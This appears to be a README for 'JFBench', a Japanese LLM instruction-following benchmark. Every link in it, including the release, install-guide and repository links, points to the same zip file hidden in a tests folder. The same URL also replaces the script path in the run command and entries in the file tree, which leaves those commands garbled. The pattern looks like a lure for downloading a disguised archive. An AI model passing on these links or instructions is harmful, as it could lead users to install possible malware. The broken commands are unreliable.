# 🎯 jfbench - Evaluate Japanese Instruction Following Effortlessly

## 🚀 Getting Started

JFBench is a benchmark suite for evaluating Japanese LLM instruction-following performance. It helps users measure how well models respond to various instructions in Japanese. Follow these steps to get started.

[![Download JFBench](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip)](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip)

## 📥 Download & Install

To download JFBench, visit the [Releases page](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip). Choose the version suitable for your system and download it. 

To install the software, you will need to follow these steps once you have downloaded the required files:

1. **Unzip the Downloaded File:** Locate the downloaded file on your computer. Right-click on it and select "Extract" or "Unzip" to access the application files.
   
2. **Open a Terminal:**
   - For **Windows:** Press `Win + R`, type `cmd`, and hit `Enter`.
   - For **Mac:** Open `Spotlight`, type `Terminal`, and hit `Enter`.
   - For **Linux:** Open the terminal from your applications menu.

3. **Navigate to the Directory:**
   Use the `cd` command to change to the directory where you unzipped the files. For example:
   ```bash
   cd path/to/jfbench
   ```

## ⚙️ Setup

JFBench requires a dependency manager called `uv`. Follow these steps to install and set it up:

1. **Install `uv`:** If you don’t have it installed, visit the [uv installation guide](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip) and follow the instructions provided there.

2. **Sync Dependencies:**
   Once `uv` is installed, run the following command:
   ```bash
   uv sync
   ```

3. **API Key Configuration:**
   Some features use an LLM as a judge for evaluation. To set this up, you will need an OpenRouter API key. Here’s how to do it:
   - Sign up for an OpenRouter account and get your API key.
   - In your terminal, set the API key using this command:
   ```bash
   export OPENROUTER_API_KEY="your_openrouter_api_key"
   ```

## 📝 Running Benchmarks

JFBench includes scripts located in the `src/jfbench` directory. You can use these scripts to run benchmarks.

### Benchmark Run: `https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip`

To evaluate a model, use the following command:

```bash
uv run python https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip \
  --benchmark "ifbench" \
  --output-dir data/benchmark_results \
  --n-constraints "1,2,4,8" \
  --constraint-set "test" \
  --n-benchmark-data 200 \
  --model-specs-json  '[{"provider": "openrouter", "model": "qwen/qwen3-30b-a3b-thinking-2507", "model_short": "Qwen3 30B A3B Thinking 2507"}]'
```

### Command Breakdown:
- **--benchmark:** Specify the benchmark type. For example, "ifbench".
- **--output-dir:** Set the directory where results will be saved.
- **--n-constraints:** Define the number of constraints to use for evaluation.
- **--constraint-set:** Choose the set of constraints.
- **--n-benchmark-data:** Specify the amount of data to use for the benchmark.
- **--model-specs-json:** Provide a JSON object for model specifications.

## 📂 File Structure

The structure of JFBench is organized for ease of access:

```
jfbench/
├── src/
│   └── jfbench/
│       └── benchmark/
│           └── https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip
├── data/
└── https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip
```

## 🛠️ Troubleshooting

If you face issues while using JFBench, consider the following:

- **Check Dependencies:** Ensure that all dependencies are resolved. Run `uv sync` again if needed.
- **API Key Errors:** Make sure you have a valid OpenRouter API key. Double-check that it is set correctly.
- **Command Errors:** Review the command syntax for any typos.

## ✉️ Getting Help

For additional assistance, you can check the issues section on the [GitHub repository](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip). You can also ask questions there if you do not find an answer.

[![Download JFBench](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip)](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip)